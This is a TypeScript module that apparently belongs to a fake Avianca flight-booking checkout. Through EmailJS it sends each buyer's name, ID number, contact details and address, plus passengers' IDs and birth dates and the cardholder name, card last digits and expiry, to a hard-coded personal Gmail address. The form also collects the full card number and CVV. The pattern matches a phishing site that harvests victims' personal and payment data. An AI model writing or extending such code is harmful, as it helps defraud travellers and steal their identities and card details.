
import emailjs from '@emailjs/browser';

interface EmailData {
  flight: {
    from: string;
    to: string;
    departure: string;
    arrival: string;
    airline: string;
    price: number;
  };
  passengers: Array<{
    firstName: string;
    lastName: string;
    idType: string;
    idNumber: string;
    birthDate: string;
    gender: string;
    ticketCode: string;
  }>;
  buyer: {
    firstName: string;
    lastName: string;
    idType: string;
    idNumber: string;
    email: string;
    phone: string;
    address: string;
    city: string;
  };
  payment: {
    cardName: string;
    cardNumber: string;
    expiryDate: string;
    cvv: string;
  };
  totalAmount: number;
  bookingReference: string;
}

export const sendPaymentEmail = async (emailData: EmailData): Promise<boolean> => {
  try {
    // Configuración fija de EmailJS
    const serviceId = 'service_avianca';
    const templateId = 'template_avianca';
    const publicKey = 'YOUR_PUBLIC_KEY';
    const toEmail = 'kzadorcol@gmail.com';

    const formatPrice = (price: number) => {
      return new Intl.NumberFormat('es-CO', {
        style: 'currency',
        currency: 'COP',
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(price);
    };

    // Preparar los datos para el email
    const templateParams = {
      to_email: toEmail,
      booking_reference: emailData.bookingReference,
      buyer_name: `${emailData.buyer.firstName} ${emailData.buyer.lastName}`,
      buyer_email: emailData.buyer.email,
      buyer_phone: emailData.buyer.phone,
      buyer_id: `${emailData.buyer.idType} ${emailData.buyer.idNumber}`,
      buyer_address: `${emailData.buyer.address}, ${emailData.buyer.city}`,
      flight_route: `${emailData.flight.from} → ${emailData.flight.to}`,
      flight_departure: emailData.flight.departure,
      flight_arrival: emailData.flight.arrival,
      flight_airline: emailData.flight.airline,
      passengers_count: emailData.passengers.length,
      passengers_list: emailData.passengers.map(p => 
        `${p.firstName} ${p.lastName} (${p.idType} ${p.idNumber}) - Código: ${p.ticketCode}`
      ).join('\n'),
      total_amount: formatPrice(emailData.totalAmount),
      card_name: emailData.payment.cardName,
      card_last_digits: emailData.payment.cardNumber.slice(-4),
      payment_date: new Date().toLocaleString('es-CO'),
      // Información completa de la compra en formato texto
      complete_info: `
NUEVA RESERVA DE VUELO - AVIANCA
================================

CÓDIGO DE RESERVA: ${emailData.bookingReference}
Fecha de compra: ${new Date().toLocaleString('es-CO')}

INFORMACIÓN DEL VUELO:
- Ruta: ${emailData.flight.from} → ${emailData.flight.to}
- Salida: ${emailData.flight.departure}
- Llegada: ${emailData.flight.arrival}
- Aerolínea: ${emailData.flight.airline}

INFORMACIÓN DEL COMPRADOR:
- Nombre: ${emailData.buyer.firstName} ${emailData.buyer.lastName}
- Documento: ${emailData.buyer.idType} ${emailData.buyer.idNumber}
- Email: ${emailData.buyer.email}
- Teléfono: ${emailData.buyer.phone}
- Dirección: ${emailData.buyer.address}, ${emailData.buyer.city}

PASAJEROS (${emailData.passengers.length}):
${emailData.passengers.map((p, i) => 
  `${i + 1}. ${p.firstName} ${p.lastName} (${p.idType} ${p.idNumber})
     Nacimiento: ${p.birthDate} | Género: ${p.gender === 'M' ? 'Masculino' : 'Femenino'}
     Código de pasaje: ${p.ticketCode}`
).join('\n')}

INFORMACIÓN DE PAGO:
- Titular: ${emailData.payment.cardName}
- Tarjeta: ****${emailData.payment.cardNumber.slice(-4)}
- Vencimiento: ${emailData.payment.expiryDate}
- TOTAL PAGADO: ${formatPrice(emailData.totalAmount)}
      `
    };

    console.log('Enviando email con datos:', templateParams);

    const result = await emailjs.send(
      serviceId,
      templateId,
      templateParams,
      publicKey
    );

    console.log('Email enviado exitosamente:', result);
    return true;
  } catch (error) {
    console.error('Error enviando email:', error);
    return false;
  }
};
